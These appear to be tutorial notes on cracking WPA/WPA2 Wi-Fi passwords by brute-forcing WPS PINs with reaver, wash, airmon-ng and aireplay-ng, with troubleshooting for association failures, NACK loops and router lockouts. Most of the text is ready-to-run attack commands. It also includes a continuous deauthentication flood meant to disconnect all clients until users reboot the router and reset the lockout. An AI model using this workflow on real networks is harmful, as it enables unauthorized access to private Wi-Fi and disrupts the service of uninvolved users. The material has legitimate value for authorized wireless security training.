# WPA/WPA2 Cracking - Exploiting WPS

## 1. Quick overview

* **WPA/WPA2**: Wi-Fi encryption using a Pre-Shared Key (PSK).
* **WPS (Wi-Fi Protected Setup)**: convenience feature (PIN or PBC). The **WPS PIN** (8 digits) can be brute-forced on vulnerable routers to reveal the WPA/WPA2 passphrase.
* **Key idea**: Reaver exploits WPS PIN vulnerabilities. If WPS is protected (lockouts, patched routers, or PBC-only) the attack may fail.

---

## 2. Tools (common)

* `airmon-ng` — put wireless card into monitor mode
* `wash` — find WPS-enabled APs
* `reaver` — brute-force WPS PIN (get WPA key if successful)
* `aireplay-ng` — fake authentication & other packet injections
* `airodump-ng` / `aircrack-ng` — capture handshakes & offline cracking
* `pixiewps` — offline Pixie Dust attack (if router vulnerable)

---

## 3. Typical workflow (step-by-step)

1. **Enable monitor mode**

   * `airmon-ng start wlan0`  → (example interface becomes `mon0`)
2. **Scan for WPS-enabled APs**

   * `wash -i mon0`
   * Note BSSID (AP MAC), Channel, SSID, WPS type (PIN/PBC)
3. **Try Reaver (simple case)**

   * `reaver -i mon0 --bssid <AP_BSSID> -c <channel> -vv`
4. **If Reaver fails with “failed to associate”**

   * Get your interface MAC: `ifconfig mon0`  (or `ip link show mon0`)
   * Start fake authentication (keeps you associated):

     ```
     aireplay-ng --fakeauth 100 -a <AP_MAC> -h <YOUR_MAC> mon0
     ```
   * Run Reaver without association:

     ```
     reaver -i mon0 -b <AP_BSSID> -c <channel> -A
     ```

     (or `--no-associate -vv` insted of `-A` depending on Reaver version)
5. **If Reaver stalls or AP locks out**

   * Check verbose logs (`-vv` / `-vvv`) → look for lockout messages or rate-limiting
   * Try alternatives (Pixie Dust, handshake capture + offline cracking) depending on router behavior

---

## 4. Troubleshooting checklist

* **“Failed to associate”** → run `aireplay-ng --fakeauth` and use `--no-associate` with Reaver.
* **Reaver stuck at 0.00% after association** → enable verbose (`-vv`/`-vvv`), check for lockouts or rate-limiting.
* **AP locks WPS after few tries** → wait for lockout to expire or try Pixie Dust (`pixiewps`) if vulnerable.
* **AP uses PBC (Push Button)** → cannot brute-force with a PIN. Requires physical/GUI action.
* **Modern/patched routers** → many are not vulnerable; use handshake capture + offline cracking or lab environment.

---


# 📘  Bypassing Ox3 and Ox4 Errors (If you got this issue)

---

## 1. Problem Recap

* In previous steps, we **fixed the association issue** using fake authentication (`aireplay-ng --fakeauth`).
* After that, Reaver sometimes gets **stuck at 0.00%** — it associates successfully but doesn’t continue trying new PINs.
* The goal here is to **debug why Reaver is stuck** and learn how to **bypass timeout or NACK-related issues**.

---

## 2. Step 1 — Debug with Verbose Output

When Reaver doesn’t progress, we need to **see what’s happening in the background**.

### Command:

```
reaver -i mon0 -b <AP_BSSID> -c <channel> --no-associate -vvv
```

* `-vvv` → enables **very verbose mode** (shows all background messages).
* Helps identify **timeouts**, **NACKs**, and **transaction failures**.
* Use only for debugging (it floods the screen with logs).

---

## 3. Step 2 — Reading the Verbose Output

In the debug output, you might see:

* Successful association ✅
* Reaver trying a PIN (e.g., `00055673`)
* Then **timeout errors** or **WPS transaction failed** messages ❌
* Reaver keeps retrying **the same PIN repeatedly** instead of moving forward → this indicates an issue with **NACK (Negative Acknowledgment) packets**.

🧠 **Explanation:**
Reaver sends and receives WPS packets to test PINs.
Some routers respond with *NACKs* (negative acknowledgments) due to out-of-order or unexpected packets.
This can trap Reaver in a loop — it retries the same PIN forever and doesn’t make progress.

---

## 4. Step 3 — Check Reaver Help for Options

Use this command:

```
reaver --help
```

You’ll find the option:

```
-N or --no-nacks
```

→ **Tells Reaver not to send NACK messages** when it receives out-of-order packets.

---

## 5. Step 4 — Apply the Fix (Bypass the 0x02 / 0x03 NACK Loop)

Re-run Reaver, adding the **--no-nacks** option:

### Fixed Command:

```
reaver -i mon0 -b <AP_BSSID> -c <channel> --no-associate --no-nacks -vv
```

✅ **Expected Result:**

* Reaver starts trying **new PINs** instead of repeating the same one.
* You’ll see different PIN values being tested (e.g., `00055678`, then `01235678`, etc.).
* Progress percentage begins to increase.

---

## 6. Step 5 — What We Learned

**Main takeaways:**

1. Use `-vvv` (triple verbose) to **debug and understand what’s happening**.
2. Check `reaver --help` for useful flags that can fix specific issues.
3. `--no-nacks` (or `-N`) helps bypass **0x02 / 0x03** transaction errors caused by NACK loops.
4. Always start fresh if previous attempts failed (`Reaver` sometimes stores session data that can interfere).

---

# 📘 WPA/WPA2 – Reaver Brute Forcing & Router Locking 

---

## 1. How Reaver Brute-Forces WPS PINs

* **WPS PIN** = 8-digit numeric code used for authentication.
* Reaver systematically tries all possible combinations (~11,000 valid PINs).
* Works even if the PIN is random, since it’s purely numeric and limited in length.

### Example:

```
reaver -i mon0 -b <AP_BSSID> -c <channel> -vv
```

* Starts brute-forcing the WPS PIN.
* Tests each combination until it finds the correct one.
* Once the correct PIN is found, Reaver calculates and displays the **WPA/WPA2 key**.

---

## 2. Reaver’s Pause and Resume Feature

* Reaver supports **resuming from where it left off**.
* You can stop the attack anytime with:

  ```
  Ctrl + C
  ```
* Later, run Reaver again with the same command. It will:

  * Detect the saved session automatically.
  * Continue from the last progress (e.g., 50%), **not from scratch**.

### Example:

```
reaver -i mon0 -b <AP_BSSID> -c <channel> -vv
```

→ When asked: *"Do you want to continue from the last session?"*
Type **yes** to resume.

---

## 3. Brute Force Speed and Time Estimation

* Reaver estimates **maximum time** to complete all 11,000 PINs.
* Example output:

  ```
  0.7% complete, estimated maximum time: 6 hours 5 minutes
  ```
* The actual time may be **shorter** if the correct PIN is found early.
* Key takeaway: **WPS brute forcing is realistic** because 11,000 combinations are not a large number.

---

## 4. WPS Locking (Rate Limiting) Explained

### ❗What It Is:

Some routers **lock their WPS feature** after too many failed PIN attempts.
Once locked:

* The router **stops responding** to WPS requests.
* Even the correct PIN will be ignored until it **unlocks**.

### How to Check Lock Status:

Run:

```
wash -i mon0
```

Look for:

```
WPS Locked: Yes / No
```

✅ **No** → router still open for attempts
❌ **Yes** → router locked, must wait or reset

---

## 5. Behavior of Different Routers

| Router Type       | Reaction After Failed Attempts | Unlock Time   |
| ----------------- | ------------------------------ | ------------- |
| Older Routers     | No lockout                     | Never locks   |
| Some ISPs Routers | Temporary lockout              | 1–5 minutes   |
| Newer Routers     | Long-term lockout              | Hours or days |

---

## 6. Simple Unlock Method (User Interaction Trick)

If WPS gets locked and you can’t continue brute forcing:

1. **Force users to restart the router manually.**

   * Use a **deauthentication attack** to disconnect all clients repeatedly.
   * This may make the user notice and **reboot the router**, which resets WPS.

2. **Command Example:**

   ```
   aireplay-ng --deauth 9999999 -a <AP_BSSID> mon0
   ```

   * `--deauth` = sends deauthentication packets.
   * `9999999` = large number of packets (continuous attack).
   * `-a` = target router MAC address.
   * `mon0` = interface in monitor mode.

3. **Wait for router restart**, then re-run Reaver:

   ```
   reaver -i mon0 -b <AP_BSSID> -c <channel> -vv
   ```

⚠️ Note: This method **depends on human reaction**, not a guaranteed unlock.

---
